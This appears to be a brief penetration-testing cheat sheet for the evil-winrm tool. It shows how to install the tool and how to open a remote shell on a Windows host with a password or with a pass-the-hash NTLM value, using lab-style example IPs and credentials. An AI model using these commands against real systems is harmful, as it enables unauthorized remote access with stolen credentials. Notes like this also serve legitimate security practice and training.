# Evil-winrm

[Repo](https://github.com/Hackplayers/evil-winrm)

## Install evil-winrm:

sudo gem install evil-winrm

## Get shell after successful enumeration

### Using a password  

-  `evil-winrm -i <target-ip> -u <username> -p <password-with-quotes>`
- Example `evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'`

### Using an hash

- `evil-winrm -i <target-ip> -u <username> -H HASH`
- Example `evil-winrm -i 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79`

> Note with an hash like this `aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e` we use the second part to be able to connect so this `823452073d75b9d1cf70ebdf86c7f98e`  
> It should work both with and without quotes

## Resources

{% embed url="https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/" %} Alternative ways to Pass the Hash (PtH) - Noopy Blog {% endembed %}  
